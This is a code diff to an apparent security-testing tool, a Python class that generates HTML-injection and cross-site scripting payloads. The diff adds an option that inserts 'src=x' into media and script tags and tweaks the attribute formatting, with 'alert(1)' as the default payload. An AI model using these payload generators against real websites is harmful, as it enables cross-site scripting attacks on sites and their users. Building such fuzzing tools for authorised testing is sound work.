@@ -40,6 +40,7 @@ class HTMLInjectionPayloadGenerator():
         self.custom_payloads = ['alert(1)']
         self.tag_break = False
         self.null_byte = False
+        self.set_src = False
 
     def get_html_tags(self):
         result = [f"<{t}>" for t in self.html_tags] 
@@ -52,7 +53,7 @@ class HTMLInjectionPayloadGenerator():
         return list(set(self.mutate(result)))
 
     def generate_all_tags_all_attributes(self):
-        result =  [f"<{t} {e}=PAYLOAD>" for t in self.html_tags for e in self.html_events]
+        result =  [f"<{t} {e}=PAYLOAD>X" for t in self.html_tags for e in self.html_events]
 
         return list(set(self.mutate(result)))
 
@@ -166,8 +167,12 @@ class HTMLInjectionPayloadGenerator():
         if self.custom_payloads:
             lista = [l.replace("PAYLOAD", p) for l in lista for p in self.custom_payloads]
 
+        if self.set_src:
+            src_lista = [l.replace(">", f" src=x>") for l in lista for s in ['embed', 'iframe', 'audio', 'img', 'input', 'script', 'source', 'track', 'video'] if s in l] 
+            lista = list(set(lista+src_lista))
+
         if self.include_id:
-            lista = [l.replace(">", f" id={self.unique_string} >") for l in lista] 
+            lista = [l.replace(">", f" id={self.unique_string}>") for l in lista] 
 
         if self.tag_break:
             lista = [self.tag_breaking(l) for l in lista]
